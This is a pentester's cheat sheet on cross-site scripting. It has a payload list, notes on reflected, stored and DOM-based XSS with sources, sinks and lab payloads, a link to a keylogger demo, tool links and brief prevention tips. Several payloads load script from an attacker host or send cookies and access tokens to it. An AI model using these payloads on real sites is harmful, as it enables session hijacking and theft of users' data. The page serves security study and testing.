# Cross-Site Scripting (XSS)

<details>

<summary><strong>Custom Payloads</strong></summary>

{% code lineNumbers="true" %}
```javascript
<script>alert(window.origin)</script>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
<script>document.location='http://OUR_IP/index.php?c='+document.cookie</script>
<script>document.location='http://OUR_IP/index.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://OUR_IP/index.php?c="+document.cookie;</script>
<script>new Image().src="http://OUR_IP/index.php?c="+localStorage.getItem('access_token');</script>
```
{% endcode %}

* [xssnow](https://xssnow.in/)
* [xss-payload-list](https://github.com/payload-box/xss-payload-list)
* [PayloadsAllTheThings-XSS-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

</details>

{% file src="../../.gitbook/assets/KeyLogger-Demo.txt" %}

### Overview

* Allows an attacker to compromise the interactions that users have with a vulnerable application
* Allows an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
* Cross-origin iframes are prevented from calling alert() in google chrome, alternative for it is the print()
* Reflected XSS, where the malicious script comes from the current HTTP request
* Stored XSS, where the malicious script comes from the website's database.
* DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

### Impact of Reflected XSS Attacks

* Perform any action within the application that the user can perform.
* View any information that the user is able to view.
* Modify any information that the user is able to modify.
* Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

## Types of XSS

### Reflected XSS

* Occurs when our input reaches the back-end server and gets returned to us without being filtered or sanitized.
* Inject payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc

### Stored XSS

* Injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
* basic example same payload as above

### DOM XSS

* DOM - is a web browser's hierarchical representation of the elements on the page.
* Occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`
* `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field. eg: `location.search`  reads input from the query string.
* `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Eg: `eval()`
* Place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript
* Most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.
* **Common Sources** - `document.URL, document.documentURI, document.URLUnencoded, document.baseURI, location, document.cooki, document.referrer, window.name, history.pushState, history.replaceState, localStorage, sessionStorage, IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB), Database`&#x20;
* **Common Sinks** - `document.write(), document.writeln(), document.domainm element.innerHTML, element.outerHTML, element.insertAdjacentHTML, element.onevent, DOM.innerHTML, DOM.outerHTML`
* **jQuery Sinks** - `add(), after(), append(), animate(), insertAfter(), insertBefore(), before(), html(), prepend(), replaceAll(), replaceWith(), wrap(), wrapInner(), wrapAll(), has(), constructor(), init(), index(), jQuery.parseHTML(), $.parseHTML()`&#x20;
* #### Reflected DOM XSS
  * Makes use of json code to reflect the payload
  * `\"-alert(1);}//` <sup><sub>(\ used to escape the double-quotes being provided auto)<sub></sup>
* #### Stored DOM XSS
  * Analyze JavaScript code to determine how the inputs from user are being handled, whether the code checks any characters which is sanitized and displayed safely
  * Look for any methods that can bypass these checks
  * `<><img src=1 onerror=alert(1)>` <sup><sub>(code encodes the first occurrence of angle brackets)<sub></sup>
* #### Control  Web Message Source
  * **DOM XSS using web messages**
    * `<script>window.addEventListener('message', function(e) { eval(e.data); });</script>` <sup><sub>(vulnerable code)<sub></sup>&#x20;
    * Payload - `<iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
  * **DOM XSS using web messages & JavaScript URL**
    *      `<script>window.addEventListener('message', function(e) {`      \
      `var url = e.data;if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {location.href = url;}}, false);</script>`      &#x20;
    * Payload - `<iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`&#x20;
* #### Testing HTML Sinks
  * Provide malicious string in a vulnerable source and search for it in the dev tool option.
* #### Testing JavaScript Execution Sinks <sup><sub>(input string not reflected in DOM)<sub></sup>
  * Make use of JavaScript debugger.
* #### Testing for DOM XSS using DOM Invader&#x20;
  * **DOM XSS in document.write sink using source location.search**&#x20;
    * Payload - `"><svg onload=alert(1)>`&#x20;
  * **DOM XSS in document.write sink using source location.search inside a select element**&#x20;
    * Introduce a new URL query parameter
    * Payload - `"></select><img+src=1 onerror=alert(1)>`
  * **DOM XSS in innerHTML sink using source location.search**&#x20;
    * The innerHTML sink doesn't accept script elements on modern browser, nor will svg onload events fire. Hence need to use alternative elements like img or iframe.
  * **DOM XSS in jQuery**

### Mutated XSS

### Auto Detect XSS

* BurpSuite
* [XSS Strike](https://github.com/s0md3v/XSStrike)
* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
* [xsser](https://github.com/epsylon/xsser)

## XSS Prevention <a href="#xss-prevention" id="xss-prevention"></a>

* Input Validation
* Input Sanitization - [DOMPurify](https://github.com/cure53/DOMPurify), addslashes
* Output HTML Encoding

#### References

* [Beyond XSS: Explore the Web Front-end Security Universe](https://aszx87410.github.io/beyond-xss/en/)

